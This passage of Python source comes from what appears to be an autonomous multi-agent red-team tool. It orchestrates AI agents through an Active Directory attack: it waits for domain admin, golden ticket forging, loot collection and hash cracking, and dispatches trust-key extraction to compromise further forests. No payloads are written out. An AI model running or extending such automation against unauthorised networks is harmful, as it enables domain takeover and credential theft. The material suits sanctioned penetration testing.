                logger.success("🎫 Golden ticket generated successfully!")
            else:
                logger.warning("🎫 All golden ticket attempts completed (some may have failed)")
            break

        logger.debug(
            f"🎫 Waiting for golden ticket ({elapsed:.0f}s/{timeout:.0f}s) - pending: {remaining}"
        )
        await asyncio.sleep(check_interval)


async def _wait_for_completion(
    dispatcher: RedTeamDispatcher,
    background_tasks: list[asyncio.Task],
    max_runtime: float = 7200.0,
    check_interval: float = 10.0,
) -> None:
    """
    Wait for operation completion or domain admin achievement.

    Args:
        dispatcher: The dispatcher instance
        background_tasks: Background tasks to monitor
        max_runtime: Maximum runtime in seconds
        check_interval: Seconds between completion checks
    """
    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        # Check runtime limit
        if elapsed > max_runtime:
            logger.warning(f"Operation reached max runtime ({max_runtime}s)")
            # Still try for golden ticket if we have krbtgt (quick operation)
            await _wait_for_golden_ticket(dispatcher, timeout=60.0)
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for domain admin or explicit completion
        if dispatcher.shared_state.has_domain_admin:
            from ares.core.config import get_multi_forest_mode, get_stop_on_golden_ticket

            # Multi-forest mode: continue until ALL forests are dominated
            if get_multi_forest_mode() and not dispatcher.shared_state.all_forests_dominated():
                # Not all forests dominated yet — reset grace timer so it starts fresh
                # when all forests eventually appear dominated
                if hasattr(_wait_for_completion, "_mf_grace_start"):
                    del _wait_for_completion._mf_grace_start
                # DA achieved but other forests remain - continue operation
                # Periodically retry trust extraction dispatch as safety net
                # (dedup in _auto_dispatch_trust_key_extraction prevents duplicates)
                _undom = dispatcher.shared_state.get_undominated_forests()
                if _undom:
                    # Find the best forest root domain to dispatch from
                    _da_doms = dispatcher.shared_state.domain_admin_domains
                    _dispatch_from = None
                    for _d in _da_doms:
                        # Prefer forest root (2-part) over child (3+ part)
                        if len(_d.split(".")) <= 2:
                            _dispatch_from = _d
                            break
                    if not _dispatch_from and _da_doms:
                        _dispatch_from = _da_doms[0]
                    if _dispatch_from:
                        try:
                            await dispatcher._auto_dispatch_trust_key_extraction(
                                da_domain=_dispatch_from,
                                da_username="Administrator",
                                undominated_forests=_undom,
                                source_agent="completion_loop_safety_net",
                            )
                        except Exception:
                            pass  # Dedup handles duplicates; errors logged inside
            else:
                # Either not multi-forest mode, or all forests dominated
                # Note: all_forests_dominated() can return True prematurely if DA achieved
                # before foreign domains discovered. In multi-forest mode, use a grace period.
                if get_multi_forest_mode():
                    # Check if we should wait for foreign domain discovery
                    if not hasattr(_wait_for_completion, "_mf_grace_start"):
                        _wait_for_completion._mf_grace_start = asyncio.get_event_loop().time()
                        logger.info(
                            "Multi-forest mode: all forests appear dominated, "
                            "waiting 300s for foreign domain discovery before declaring complete"
                        )
                    _mf_elapsed = (
                        asyncio.get_event_loop().time() - _wait_for_completion._mf_grace_start
                    )
                    if _mf_elapsed < 300:
                        await asyncio.sleep(5.0)
                        continue
                    dominated = dispatcher.shared_state.domain_admin_domains
                    logger.success(
                        f"All forests dominated ({', '.join(dominated)})! Operation complete."
                    )
                elif get_stop_on_golden_ticket():
                    logger.success("Domain Admin achieved! Continuing to forge golden ticket...")
                else:
                    logger.success("Domain Admin achieved! Operation complete.")
                # Wait for loot collection (share spider, etc.) while background tasks are still running
                await _wait_for_loot_collection(dispatcher)
                # Wait for golden ticket generation (if krbtgt hash is available)
                await _wait_for_golden_ticket(dispatcher)
                # Wait for running crack tasks before fully exiting
                await _wait_for_crack_tasks(dispatcher)
                break
        if dispatcher.shared_state.completed:
            logger.success("Operation marked complete.")
            # Wait for golden ticket generation (if krbtgt hash is available)
            await _wait_for_golden_ticket(dispatcher)
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for failed background tasks
        for task in background_tasks:
            if task.done() and not task.cancelled():
                exc = task.exception()
                if exc:
                    logger.error(f"Background task {task.get_name()} failed: {exc}")

        await asyncio.sleep(check_interval)


def _build_orchestrator_prompt(
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
) -> str:
    """
    Build the initial prompt for the orchestrator agent.

    Args:
        target_domain: Target domain
        target_ips: Target IPs
        initial_credential: Initial credential if available

    Returns:
        Formatted prompt string
    """
    from ares.core.templates import get_template_loader

    cred_info = "None (start with unauthenticated recon)"
    if initial_credential:
        cred_info = f"{initial_credential.domain}\\{initial_credential.username}"

    return get_template_loader().render(
        "redteam/agents/orchestrator_initial.md.jinja",
        target_domain=target_domain,
        target_ips=target_ips,
        cred_info=cred_info,
    )


__all__ = [
    "run_multi_agent_operation",
]
